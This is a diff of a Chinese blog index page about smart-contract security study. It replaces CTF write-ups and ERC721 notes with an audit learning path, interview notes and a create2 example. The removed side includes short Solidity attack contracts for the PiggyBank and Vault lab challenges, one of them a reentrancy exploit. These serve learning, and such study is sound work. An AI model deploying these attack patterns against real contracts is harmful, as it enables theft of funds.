@@ -73,10 +73,10 @@
       <div class="outer">
         <section id="main">
   
-    <article id="post-区块链开发/ERC721/ERC721" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-区块链安全/学习路径" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2023/12/03/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BC%80%E5%8F%91/ERC721/ERC721/" class="article-date">
-  <time class="dt-published" datetime="2023-12-03T12:33:55.927Z" itemprop="datePublished">2023-12-03</time>
+    <a href="/2024/01/18/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%AD%A6%E4%B9%A0%E8%B7%AF%E5%BE%84/" class="article-date">
+  <time class="dt-published" datetime="2024-01-18T02:37:31.846Z" itemprop="datePublished">2024-01-18</time>
 </a>
     
   </div>
@@ -85,31 +85,37 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <p>一种代币，外加一个nft系统，存储了众多的nft、</p>
-<p>tokenID：nft的id</p>
-<p>_approval:将owner任命为id号nft的主人</p>
-<p>_operatorApprovals [ owner ] [ oprator ] : owner是否允许oprator转移，操作nft</p>
-<p>_tokenApprovals[ tokenID ] : 可以对tokenID执行操作的人</p>
-<p>owner [ tokenID ] : tokenid 的所有者</p>
-<p>setApproval</p>
-<p>safetransferFrom 需要先setApprovalForAll</p>
-<p>tokenURI( tokenID )指向一个json文件，了解更多关于该nft的信息</p>
-<p><img src="/2023/12/03/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BC%80%E5%8F%91/ERC721/ERC721/image.png" alt="Alt text"></p>
-<p>nft的接收者需要实现这个方法，在用户调用ERC721.safeTransferFrom时，就会自动调用to合约的onERC721Received方法（因为safeTransferFrom里面有checkOnERC721Received方法，这个方法有调用to.onERC721Received的逻辑）<br><img src="/2023/12/03/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BC%80%E5%8F%91/ERC721/ERC721/image-2.png" alt="Alt text"></p>
-<p><img src="/2023/12/03/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BC%80%E5%8F%91/ERC721/ERC721/image-1.png" alt="Alt text"></p>
-<p>实验中生成价格的参数：0x000000000000000000000000000000000000000000000000000001c6bf52634000<br>(68位)</p>
-<p>函数选择器：为函数签名Keccak哈希的前4个字节</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bytes4(keccak256&quot;functionName(address ,uint256 ,string,uint8[2])&quot;)</span><br></pre></td></tr></table></figure>
-
-
-
-
-<p>是否接受函数成功，要求对方实现了IERC721Reveiver接口并实现了onERC721Received方法</p>
+        <p>理论前置：</p>
+<p>钱包密钥产生流程</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/ethereumbook/ethereumbook">更加了解以太坊</a><br>有一本书的量</p>
+<p>几百个金融基础(1 hour each)</p>
+<p>solidity开发基础<br>wtf学院的开发案例</p>
+<p><a target="_blank" rel="noopener" href="https://learnblockchain.cn/docs/foundry/i18n/zh/getting-started/installation.html">foundry框架</a></p>
+<p>ERCxxx<br>protocol（是什么？）<br>性质<br>解决什么问题<br>强调技术是什么</p>
+<p>需要编写工具来验证漏洞</p>
+<p>常见攻击手法：<br>在swc中查看</p>
+<p>三个靶场，用来检擦学习效率</p>
+<p>solodit：审计报告</p>
+<p>看很多审计报告总结出你自己的chainlist</p>
+<p>多去开拓审计报告</p>
+<p>审计报告的流程：<br>step1：看项目赛道，了解项目的大致用途</p>
+<p>系统存在什么功能</p>
+<p>列出external，internal，public，private</p>
+<p>分清楚所有角色，理清楚各个角色可以和各种方法的互动</p>
+<p>列出和处理资产有关的功能</p>
+<p>理解清楚开发者的注解，并不断挑战其理解的内容</p>
+<p>查看该项目是否是fork以前的某个项目，并以此为基础查看过去的相关审计报告</p>
+<p>run forge covrage 看测试的涵盖率</p>
+<p>step2：<br>工具<br>画图工具</p>
+<p>扫描工具（误报率高，可以看开发者对安全注不注重）<br><img src="/2024/01/18/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%AD%A6%E4%B9%A0%E8%B7%AF%E5%BE%84/image.png" alt="Alt text"></p>
+<p>step3：<br>看是否存在常见错误<br>看是否按照eip标准来开发</p>
+<p>step4：<br>开发poc，测试，证明漏洞是成立的</p>
+<p>step5：<br>写报告，需要附上poc<br>修补建议</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://oo90909.github.io/2023/12/03/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BC%80%E5%8F%91/ERC721/ERC721/" data-id="clriklc7i000bn4ud7k9f727o" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="https://oo90909.github.io/2024/01/18/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%AD%A6%E4%B9%A0%E8%B7%AF%E5%BE%84/" data-id="clt84owba0002dkud9xw20j4n" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -121,10 +127,10 @@
 
 
   
-    <article id="post-区块链安全/其他/Missing" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-readme/面试" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/Missing/" class="article-date">
-  <time class="dt-published" datetime="2023-11-27T08:58:00.000Z" itemprop="datePublished">2023-11-27</time>
+    <a href="/2024/01/15/readme/%E9%9D%A2%E8%AF%95/" class="article-date">
+  <time class="dt-published" datetime="2024-01-15T08:18:53.182Z" itemprop="datePublished">2024-01-15</time>
 </a>
     
   </div>
@@ -135,7 +141,7 @@
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/Missing/">Missing</a>
+      <a class="p-name article-title" href="/2024/01/15/readme/%E9%9D%A2%E8%AF%95/">面试</a>
     </h1>
   
 
@@ -143,13 +149,14 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.19;</span><br><span class="line"></span><br><span class="line">contract Challenge &#123;</span><br><span class="line">    address public r;</span><br><span class="line"></span><br><span class="line">    constructor(address) &#123;</span><br><span class="line">        bytes memory code =</span><br><span class="line">            hex&quot;608060405234801561001057600080fd5b5061011d806100206000396000f3fe6080604052348015600f57600080fd5b5060043610602d5760003560e01c8015603257806364d98f6e14603a575b600080fd5b6038605a565b005b60005460469060ff1681565b604051901515815260200160405180910390f35b5a602060006020818283843388f15060045b333b81121560a6578283838485335af160021c51835181108015609357604084208452609d565b6040828152852084525b5050600201606c565b507f58898ce26697138ee057566d1fcfbcf1384f625d0aa51e80fbc9c44e6cd8a65881510360d357600181555b6160ff5a8403111560e2578081555b50505056fea26469706673582212207a0964c9fb7e33d9e5fb6dc6c17d84280dbbfabeb4429f2206529aca0a65122264736f6c63430008170033&quot;;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            sstore(r.slot, create(0, add(code, 0x20), mload(code)))//把create的合约地址存放在r上面</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isSolved() public returns (bool) &#123;</span><br><span class="line">        return Challenge(r).isSolved();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>code的字节码并不是Challenge编译出来的字节码，也就是说即使不是同一个合约，也可以转化成同一个合约并调用同名的方法<br>会不会编译出来的字节码和版本有关呢</p>
+        <p>问题：<br>1.create和create2的区别<br>2.方法栈溢出错误怎么办（不知道）<br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/651920715#:~:text=Solidity%20%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8%EF%BC%8C%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%20%EF%BC%88%E4%B8%8A%E7%AF%87%EF%BC%89%201%20%E8%B5%84%E9%87%91%E8%A2%AB%E7%9B%97,2%20%E8%B5%84%E9%87%91%E8%A2%AB%E9%94%81%E4%BD%8F%E6%88%96%E5%86%BB%E7%BB%93%E5%9C%A8%E5%90%88%E7%BA%A6%E5%86%85%203%20%E4%BA%BA%E4%BB%AC%E6%94%B6%E5%88%B0%E7%9A%84%E5%A5%96%E5%8A%B1%E6%AF%94%E9%A2%84%E6%9C%9F%E7%9A%84%E5%B0%91%EF%BC%88%E5%A5%96%E5%8A%B1%E8%A2%AB%E5%BB%B6%E8%BF%9F%E6%88%96%E5%87%8F%E5%B0%91%EF%BC%89%E3%80%82%204%20%E4%BA%BA%E4%BB%AC%E6%94%B6%E5%88%B0%E7%9A%84%E5%A5%96%E5%8A%B1%E6%AF%94%E9%A2%84%E6%9C%9F%E7%9A%84%E5%A4%9A%EF%BC%88%E5%AF%BC%E8%87%B4%E9%80%9A%E8%B4%A7%E8%86%A8%E8%83%80%E5%92%8C%E8%B4%AC%E5%80%BC%EF%BC%89%E3%80%82">3.常见漏洞类型是什么</a><br><img src="/2024/01/15/readme/%E9%9D%A2%E8%AF%95/image.png" alt="Alt text"><br>未回答全，这里应该是想要我系统回答，回答的越多越好，我只说了几个</p>
+<p>4.反编译能力怎么样(字节码编译成合约代码，还没有能力编译)</p>
+<p>从youtube中提取的问题：<br>btc的经典交易流程</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://oo90909.github.io/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/Missing/" data-id="clriklc7k000gn4udgp0d0zbt" data-title="Missing" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="https://oo90909.github.io/2024/01/15/readme/%E9%9D%A2%E8%AF%95/" data-id="clt84owbf000adkud5ey95r4k" data-title="面试" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -161,10 +168,10 @@
 
 
   
-    <article id="post-区块链安全/其他/PiggyBank" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-区块链安全/ethernaut/create2" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/PiggyBank/" class="article-date">
-  <time class="dt-published" datetime="2023-11-27T08:58:00.000Z" itemprop="datePublished">2023-11-27</time>
+    <a href="/2024/01/13/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/ethernaut/create2/" class="article-date">
+  <time class="dt-published" datetime="2024-01-13T10:02:39.441Z" itemprop="datePublished">2024-01-13</time>
 </a>
     
   </div>
@@ -175,7 +182,7 @@
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/PiggyBank/">PiggyBank</a>
+      <a class="p-name article-title" href="/2024/01/13/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/ethernaut/create2/">create2</a>
     </h1>
   
 
@@ -183,24 +190,14 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <p>研究下面的条件就可以发现，要求thief的每一个元素都是deadbeef，<br>疑点：<br><img src="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/PiggyBank/image.png" alt="Alt text"><br>这里assembly的执行顺序是什么？明明第二步就给thiefcode赋值了，但是extcodecopy结束以后才赋值成功</p>
-<p>thifecode中的每一个元素是否都是8个16进制数？内存是怎么区分它的每一个元素的？</p>
-<p><img src="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/PiggyBank/image-1.png"><br>在内存中也存了一份<br><img src="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/PiggyBank/image-2.png" alt="Alt text"></p>
-<p>思路一：模仿magicnumber那样，在创建时代码中调用steal，运行时代码全都是deadbeef就可以了，然后再create</p>
-<p>返回目标值的运行时代码<br>73deadbeefdeadbeefdeadbeefdeadbeefdeadbeef600052601c6000f3<br><img src="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/PiggyBank/image-3.png" alt="Alt text"><br>return是这样的，但是也无所谓，因为这些0都会消失<br><img src="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/PiggyBank/image-4.png" alt="Alt text"></p>
-<p>包含create的创建时代码<br>7b73deadbeefdeadbeefdeadbeefdeadbeefdeadbeef600052601c6000f3600052601c60006000f0</p>
-<p>那要如何调用那个合约的函数呢？用call函数，再上面那一部分代码之前调用call函数即可</p>
-<hr>
-<p>###正解：<br>其实并没有那么复杂，看题目的时候看错了，只需要满足某一次if条件就会转账成功然后return，因此不需要创建合约，只需要保证合约字节码里面有deadbeef就可以了，这个时候就需要使用mstore就行了</p>
-<p><img src="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/PiggyBank/image-6.png" alt="看绿色的字，这里需要注意一些条件"></p>
-<p>###成功<br><img src="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/PiggyBank/image-5.png" alt="Alt text"></p>
-<p>攻击合约：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">contract attack&#123;</span><br><span class="line"></span><br><span class="line">    PiggyBank pb;</span><br><span class="line"></span><br><span class="line">constructor(address _pb)public  &#123;</span><br><span class="line">pb=PiggyBank(_pb);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function hack()public  &#123;</span><br><span class="line">    assembly&#123;</span><br><span class="line">    mstore(0,0xdeadbeef00)//这里要满足几个条件：保证字节数必须是偶数，而不是字符数，也就是说如果</span><br><span class="line">    //告诉你是奇数，那就代表你少了两个字符，如果revert not found则有以下几种情况：deadbeef前面</span><br><span class="line">    //有偶数个字符，则d和e会被拆分开，那就需要在前面加一个字符；真的没有deadbeef</span><br><span class="line">&#125;</span><br><span class="line">    pb.steal();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function () external  payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
+        <p><a target="_blank" rel="noopener" href="https://learnblockchain.cn/article/6003">create2看这篇文章</a></p>
+<p>create2和create最大的区别在于：<br>没有nonce去干扰创造时的状态，每一个create的参数都是可控制的，也就是说现在创建的合约和1年后创建的合约地址是相同的<br>关于create2（）的案例：<br>salt是什么：一个随机数</p>
+<p><img src="/2024/01/13/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/ethernaut/create2/image-1.png" alt="Alt text"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.20;</span><br><span class="line"></span><br><span class="line">contract Factory &#123;</span><br><span class="line">    // Returns the address of the newly deployed contract</span><br><span class="line">    function deploy(</span><br><span class="line">        address _owner,</span><br><span class="line">        uint _foo,</span><br><span class="line">        bytes32 _salt</span><br><span class="line">    ) public payable returns (address) &#123;</span><br><span class="line">        // This syntax is a newer way to invoke create2 without assembly, you just need to pass salt</span><br><span class="line">        // https://docs.soliditylang.org/en/latest/control-structures.html#salted-contract-creations-create2</span><br><span class="line">        return address(new TestContract&#123;salt: _salt&#125;(_owner, _foo));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// This is the older way of doing it using assembly</span><br><span class="line">contract FactoryAssembly &#123;</span><br><span class="line">    event Deployed(address addr, uint salt);</span><br><span class="line"></span><br><span class="line">    // 1. Get bytecode of contract to be deployed</span><br><span class="line">    // NOTE: _owner and _foo are arguments of the TestContract&#x27;s constructor</span><br><span class="line">    function getBytecode(address _owner, uint _foo) public pure returns (bytes memory) &#123;</span><br><span class="line">        bytes memory bytecode = type(TestContract).creationCode;</span><br><span class="line"></span><br><span class="line">        return abi.encodePacked(bytecode, abi.encode(_owner, _foo));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 2. Compute the address of the contract to be deployed</span><br><span class="line">    // NOTE: _salt is a random number used to create an address</span><br><span class="line">    function getAddress(</span><br><span class="line">        bytes memory bytecode,</span><br><span class="line">        uint _salt</span><br><span class="line">    ) public view returns (address) &#123;</span><br><span class="line">        bytes32 hash = keccak256(</span><br><span class="line">            abi.encodePacked(bytes1(0xff), address(this), _salt, keccak256(bytecode))</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        // NOTE: cast last 20 bytes of hash to address</span><br><span class="line">        return address(uint160(uint(hash)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 3. Deploy the contract</span><br><span class="line">    // NOTE:</span><br><span class="line">    // Check the event log Deployed which contains the address of the deployed TestContract.</span><br><span class="line">    // The address in the log should equal the address computed from above.</span><br><span class="line">    function deploy(bytes memory bytecode, uint _salt) public payable &#123;</span><br><span class="line">        address addr;</span><br><span class="line"></span><br><span class="line">        /*</span><br><span class="line">        NOTE: How to call create2</span><br><span class="line"></span><br><span class="line">        create2(v, p, n, s)</span><br><span class="line">        create new contract with code at memory p to p + n</span><br><span class="line">        and send v wei</span><br><span class="line">        and return the new address</span><br><span class="line">        where new address = first 20 bytes of keccak256(0xff + address(this) + s + keccak256(mem[p…(p+n)))</span><br><span class="line">              s = big-endian 256-bit value</span><br><span class="line">        */</span><br><span class="line">        assembly &#123;</span><br><span class="line">            addr := create2(</span><br><span class="line">                callvalue(), // wei sent with current call</span><br><span class="line">                // Actual code starts after skipping the first 32 bytes</span><br><span class="line">                add(bytecode, 0x20),</span><br><span class="line">                mload(bytecode), // Load the size of code contained in the first 32 bytes</span><br><span class="line">                _salt // Salt from function arguments</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">            if iszero(extcodesize(addr)) &#123;</span><br><span class="line">                revert(0, 0)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        emit Deployed(addr, _salt);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract TestContract &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    uint public foo;</span><br><span class="line"></span><br><span class="line">    constructor(address _owner, uint _foo) payable &#123;</span><br><span class="line">        owner = _owner;</span><br><span class="line">        foo = _foo;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getBalance() public view returns (uint) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://oo90909.github.io/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/PiggyBank/" data-id="clriklc7k000hn4ud11vic57c" data-title="PiggyBank" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="https://oo90909.github.io/2024/01/13/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/ethernaut/create2/" data-id="clt84owbj000jdkud91km1vvd" data-title="create2" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -212,10 +209,10 @@
 
 
   
-    <article id="post-区块链安全/其他/Vault" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-区块链安全/ethernaut/decompile" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/Vault/" class="article-date">
-  <time class="dt-published" datetime="2023-11-27T08:58:00.000Z" itemprop="datePublished">2023-11-27</time>
+    <a href="/2024/01/13/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/ethernaut/decompile/" class="article-date">
+  <time class="dt-published" datetime="2024-01-13T07:10:41.739Z" itemprop="datePublished">2024-01-13</time>
 </a>
     
   </div>
@@ -226,7 +223,7 @@
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/Vault/">Vault</a>
+      <a class="p-name article-title" href="/2024/01/13/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/ethernaut/decompile/">decompile tool</a>
     </h1>
   
 
@@ -234,21 +231,11 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <p>真的不容易。。。<br>尝试了好几种方法都以失败告终<br>###尝试一：<br>单纯的重入漏洞，就上课讲的那个，这种攻击需要满足：<br>balanceOf[…]可以溢出（0.8以下版本或者unchecked），或者withdraw方法无法回滚，否则会因为交易失败而回滚，但是题中均不满足<br><img src="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/Vault/image-1.png" alt="Alt text"><br>###尝试二：<br>想着用msg.value多次传入<br><img src="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/Vault/image-2.png" alt="Alt text"></p>
-<p>这里是因为上次考试的第三题产生的想法，其实我并没有把那道题理解透彻，所以会有这种想法</p>
-<hr>
-<p>###正解：<br>不一定非要把valut合约中的余额取干净，只要在余额为0的时候调用solve就可以了，之后再deposit，把钱充值回去，类似于闪电贷<br>思路图：<br><img src="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/Vault/99809584D870EC2E106BE6197CE09170.jpg" alt="Alt text"></p>
-<p>最后结果达成了，flag为true，但是余额却不是0<br><img src="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/Vault/image-3.png" alt="Alt text"></p>
-<p>成功！<br><img src="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/Vault/image-4.png" alt="Alt text"></p>
-<p>实现过程中出现了一些问题，导致花在实现的时间上很长，也发现了<br>用console.log这个时候比debug好用的多<br><img src="/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/Vault/image.png" alt="Alt text"></p>
-<p>攻击合约：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">contract attack&#123;</span><br><span class="line"></span><br><span class="line">Vault va;</span><br><span class="line"></span><br><span class="line">uint8 count=0;//这里设置count是因为要严格区分第一次和第二次调用receive方法</span><br><span class="line"></span><br><span class="line">constructor()payable  &#123;&#125;</span><br><span class="line"></span><br><span class="line">function getPara(address to)public payable &#123;</span><br><span class="line">    va=Vault(to);</span><br><span class="line">  va.deposit&#123;value:msg.value&#125;();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function start()public payable &#123;</span><br><span class="line">va.withdraw(100);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">receive() external payable &#123; </span><br><span class="line">   if (count==0)&#123;//第一次调用receive</span><br><span class="line">    console.log(&quot;attack balance is&quot;,address(va).balance,&quot;the count is&quot;,count);</span><br><span class="line">        count++;</span><br><span class="line">    va.withdraw(100);</span><br><span class="line">    console.log(&quot;attack balance is&quot;,address(va).balance,&quot;the count is&quot;,count);</span><br><span class="line">   &#125;</span><br><span class="line">   if (count==1)&#123;//第二次调用reveive</span><br><span class="line">    count++;</span><br><span class="line">    console.log(&quot;attack balance is&quot;,address(va).balance,&quot;the count is&quot;,count);</span><br><span class="line">    va.solve(59);</span><br><span class="line">    va.deposit&#123;value:100&#125;();</span><br><span class="line">    console.log(&quot;deposit successful,va balance is&quot;,address(va).balance);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
+        
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://oo90909.github.io/2023/11/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96/Vault/" data-id="clriklc7k000in4uder3v59k9" data-title="Vault" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="https://oo90909.github.io/2024/01/13/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/ethernaut/decompile/" data-id="clt84owbi000hdkud7q1k6bxt" data-title="decompile tool" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -260,10 +247,43 @@
 
 
   
-    <article id="post-区块链安全/其他/jump" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-杂文/毛泽东" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
